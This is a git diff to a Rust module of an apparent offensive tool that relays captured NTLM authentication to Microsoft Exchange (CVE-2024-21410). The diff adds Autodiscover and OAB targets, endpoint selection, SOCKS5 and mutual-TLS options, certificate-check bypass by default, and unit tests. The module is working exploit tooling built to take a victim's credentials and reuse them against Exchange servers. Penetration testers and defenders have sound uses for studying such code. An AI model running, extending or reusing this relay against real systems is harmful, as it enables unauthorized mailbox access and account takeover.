@@ -1,4 +1,4 @@
-﻿//! Exchange Relay Target (CVE-2024-21410) — NTLM relay to Microsoft Exchange.
+//! Exchange Relay Target (CVE-2024-21410) — NTLM relay to Microsoft Exchange.
 //!
 //! Relays captured NTLM authentication to Exchange MAPI-over-HTTP or EWS endpoints.
 //! Pre-CU14 Exchange servers (and many unpatched post-CU14 servers) accept NTLM
@@ -19,7 +19,8 @@ use tokio_rustls::rustls::client::danger::{
 use tokio_rustls::rustls::crypto::{
     CryptoProvider, aws_lc_rs::default_provider, verify_tls12_signature, verify_tls13_signature,
 };
-use tokio_rustls::rustls::pki_types::{CertificateDer, ServerName, UnixTime};
+use tokio_rustls::rustls::pki_types::{CertificateDer, PrivateKeyDer, ServerName, UnixTime};
+use tokio_rustls::rustls::pki_types::pem::PemObject;
 use tokio_rustls::rustls::{ClientConfig, DigitallySignedStruct, RootCertStore, SignatureScheme};
 use tracing::{debug, info, warn};
 
@@ -39,10 +40,16 @@ pub struct ExchangeRelayConfig {
     pub accept_self_signed: bool,
     pub ews_path: String,
     pub mapi_path: String,
+    pub autodiscover_path: String,
+    pub oab_path: String,
     pub prefer_mapi: bool,
     pub exchange_version: ExchangeVersion,
     /// Optional SOCKS5 proxy for outbound connections (format: `host:port`).
     pub socks5_proxy: Option<String>,
+    /// Target endpoint type for relay
+    pub endpoint_type: ExchangeEndpoint,
+    /// Optional mTLS client identity for connections to the Exchange server.
+    pub tls_client_identity: Option<crate::relay::TlsIdentity>,
 }
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -52,6 +59,21 @@ pub enum ExchangeVersion {
     Exchange2019,
     ExchangeOnline,
     AutoDetect,
+}
+
+/// Exchange endpoint types for NTLM relay targeting
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum ExchangeEndpoint {
+    /// EWS (Exchange Web Services) - /EWS/Exchange.asmx
+    Ews,
+    /// MAPI-over-HTTP - /mapi/
+    Mapi,
+    /// Autodiscover - /autodiscover/autodiscover.xml
+    Autodiscover,
+    /// OAB (Offline Address Book) - /oab/
+    Oab,
+    /// Auto-detect and try all endpoints
+    Auto,
 }
 
 impl std::fmt::Display for ExchangeVersion {
@@ -66,6 +88,18 @@ impl std::fmt::Display for ExchangeVersion {
     }
 }
 
+impl std::fmt::Display for ExchangeEndpoint {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        match self {
+            Self::Ews => write!(f, "EWS"),
+            Self::Mapi => write!(f, "MAPI"),
+            Self::Autodiscover => write!(f, "Autodiscover"),
+            Self::Oab => write!(f, "OAB"),
+            Self::Auto => write!(f, "Auto"),
+        }
+    }
+}
+
 impl Default for ExchangeRelayConfig {
     fn default() -> Self {
         Self {
@@ -76,9 +110,13 @@ impl Default for ExchangeRelayConfig {
             accept_self_signed: true,
             ews_path: "/EWS/Exchange.asmx".into(),
             mapi_path: "/mapi/".into(),
+            autodiscover_path: "/autodiscover/autodiscover.xml".into(),
+            oab_path: "/oab/".into(),
             prefer_mapi: true,
             exchange_version: ExchangeVersion::AutoDetect,
             socks5_proxy: None,
+            endpoint_type: ExchangeEndpoint::Auto,
+            tls_client_identity: None,
         }
     }
 }
@@ -167,11 +205,31 @@ async fn handle_exchange_relay(
     let ntlm_negotiate = extract_ntlm_from_http(victim_body)
         .ok_or_else(|| RelayError::Protocol("No NTLM negotiate in victim request".into()))?;
 
-    let paths: &[&str] = if config.prefer_mapi {
-        &[&config.mapi_path, &config.ews_path]
-    } else {
-        &[&config.ews_path, &config.mapi_path]
+    let paths: Vec<&str> = match config.endpoint_type {
+        ExchangeEndpoint::Ews => vec![&config.ews_path],
+        ExchangeEndpoint::Mapi => vec![&config.mapi_path],
+        ExchangeEndpoint::Autodiscover => vec![&config.autodiscover_path],
+        ExchangeEndpoint::Oab => vec![&config.oab_path],
+        ExchangeEndpoint::Auto => {
+            // Try all endpoints in priority order: MAPI > EWS > Autodiscover > OAB
+            if config.prefer_mapi {
+                vec![
+                    &config.mapi_path,
+                    &config.ews_path,
+                    &config.autodiscover_path,
+                    &config.oab_path,
+                ]
+            } else {
+                vec![
+                    &config.ews_path,
+                    &config.mapi_path,
+                    &config.autodiscover_path,
+                    &config.oab_path,
+                ]
+            }
+        }
     };
+    let paths: &[&str] = &paths;
 
     let exchange_addr = format!("{}:{}", config.target_host, config.target_port);
     info!(
@@ -282,12 +340,9 @@ async fn handle_exchange_relay(
 async fn connect_exchange_stream(
     config: &ExchangeRelayConfig,
 ) -> Result<Box<dyn ExchangeIo + Send>> {
-    let target: std::net::SocketAddr = format!(
-        "{}:{}",
-        config.target_host, config.target_port
-    )
-    .parse()
-    .map_err(|e| RelayError::Config(format!("Invalid Exchange target address: {e}")))?;
+    let target: std::net::SocketAddr = format!("{}:{}", config.target_host, config.target_port)
+        .parse()
+        .map_err(|e| RelayError::Config(format!("Invalid Exchange target address: {e}")))?;
     let tcp = crate::utils::socks5_connect(target, IO_TIMEOUT, config.socks5_proxy.as_deref())
         .await
         .map_err(|e| RelayError::Network(format!("Exchange connect failed: {e}")))?;
@@ -296,7 +351,7 @@ async fn connect_exchange_stream(
         return Ok(Box::new(tcp));
     }
 
-    let client_config = build_tls_client_config(config.accept_self_signed);
+    let client_config = build_tls_client_config(config.accept_self_signed, config.tls_client_identity.as_ref())?;
     let connector = TlsConnector::from(Arc::new(client_config));
     let server_name = ServerName::try_from(config.target_host.clone())
         .map_err(|e| RelayError::Config(format!("Invalid Exchange TLS server name: {e}")))?;
@@ -308,16 +363,33 @@ async fn connect_exchange_stream(
     Ok(Box::new(tls))
 }
 
-fn build_tls_client_config(accept_self_signed: bool) -> ClientConfig {
+fn build_tls_client_config(
+    accept_self_signed: bool,
+    identity: Option<&crate::relay::TlsIdentity>,
+) -> std::result::Result<ClientConfig, RelayError> {
+    let provider = Arc::new(rustls::crypto::aws_lc_rs::default_provider());
     let mut root_store = RootCertStore::empty();
     let native_certs = rustls_native_certs::load_native_certs();
     for cert in native_certs.certs {
         let _ = root_store.add(cert);
     }
 
-    let mut config = ClientConfig::builder()
-        .with_root_certificates(root_store)
-        .with_no_client_auth();
+    let builder = ClientConfig::builder_with_provider(provider)
+        .with_protocol_versions(&[&rustls::version::TLS12, &rustls::version::TLS13])
+        .map_err(|e| RelayError::Config(format!("TLS protocol version error: {e}")))?
+        .with_root_certificates(root_store);
+
+    let mut config = match identity {
+        Some(id) => {
+            let cert = CertificateDer::from_pem_slice(id.cert_pem.as_bytes())
+                .map_err(|e| RelayError::Config(format!("failed to parse client cert PEM: {e}")))?;
+            let key = PrivateKeyDer::from_pem_slice(id.key_pem.as_bytes())
+                .map_err(|e| RelayError::Config(format!("failed to parse client key PEM: {e}")))?;
+            builder.with_client_auth_cert(vec![cert], key)
+                .map_err(|e| RelayError::Config(format!("failed to set client auth cert: {e}")))?
+        }
+        None => builder.with_no_client_auth(),
+    };
 
     if accept_self_signed {
         config
@@ -325,7 +397,7 @@ fn build_tls_client_config(accept_self_signed: bool) -> ClientConfig {
             .set_certificate_verifier(Arc::new(NoCertificateVerification::default()));
     }
 
-    config
+    Ok(config)
 }
 
 #[derive(Debug)]
@@ -485,5 +557,63 @@ mod tests {
     fn test_exchange_version_display() {
         assert_eq!(ExchangeVersion::Exchange2019.to_string(), "Exchange 2019");
         assert_eq!(ExchangeVersion::AutoDetect.to_string(), "Auto-Detect");
+    }
+
+    #[test]
+    fn test_exchange_endpoint_display() {
+        assert_eq!(ExchangeEndpoint::Ews.to_string(), "EWS");
+        assert_eq!(ExchangeEndpoint::Mapi.to_string(), "MAPI");
+        assert_eq!(ExchangeEndpoint::Autodiscover.to_string(), "Autodiscover");
+        assert_eq!(ExchangeEndpoint::Oab.to_string(), "OAB");
+        assert_eq!(ExchangeEndpoint::Auto.to_string(), "Auto");
+    }
+
+    #[test]
+    fn test_exchange_config_has_all_paths() {
+        let cfg = ExchangeRelayConfig::default();
+        assert_eq!(cfg.ews_path, "/EWS/Exchange.asmx");
+        assert_eq!(cfg.mapi_path, "/mapi/");
+        assert_eq!(cfg.autodiscover_path, "/autodiscover/autodiscover.xml");
+        assert_eq!(cfg.oab_path, "/oab/");
+        assert_eq!(cfg.endpoint_type, ExchangeEndpoint::Auto);
+    }
+
+    #[test]
+    fn test_exchange_endpoint_variants() {
+        let ews_cfg = ExchangeRelayConfig {
+            endpoint_type: ExchangeEndpoint::Ews,
+            ..ExchangeRelayConfig::default()
+        };
+        assert_eq!(ews_cfg.endpoint_type, ExchangeEndpoint::Ews);
+
+        let oab_cfg = ExchangeRelayConfig {
+            endpoint_type: ExchangeEndpoint::Oab,
+            ..ExchangeRelayConfig::default()
+        };
+        assert_eq!(oab_cfg.endpoint_type, ExchangeEndpoint::Oab);
+    }
+
+    #[test]
+    fn test_exchange_config_tls_identity_default_none() {
+        let cfg = ExchangeRelayConfig::default();
+        assert!(cfg.tls_client_identity.is_none());
+    }
+
+    #[test]
+    fn test_build_tls_client_config_no_identity_succeeds() {
+        let config = build_tls_client_config(false, None);
+        assert!(config.is_ok());
+    }
+
+    #[test]
+    fn test_build_tls_client_config_with_bad_pem_fails() {
+        let identity = crate::relay::TlsIdentity {
+            cert_pem: "not-a-cert".into(),
+            key_pem: "not-a-key".into(),
+        };
+        let result = build_tls_client_config(false, Some(&identity));
+        assert!(result.is_err());
+        let err = format!("{}", result.unwrap_err());
+        assert!(err.contains("failed to parse"), "error should mention parse: got '{err}'");
     }
 }
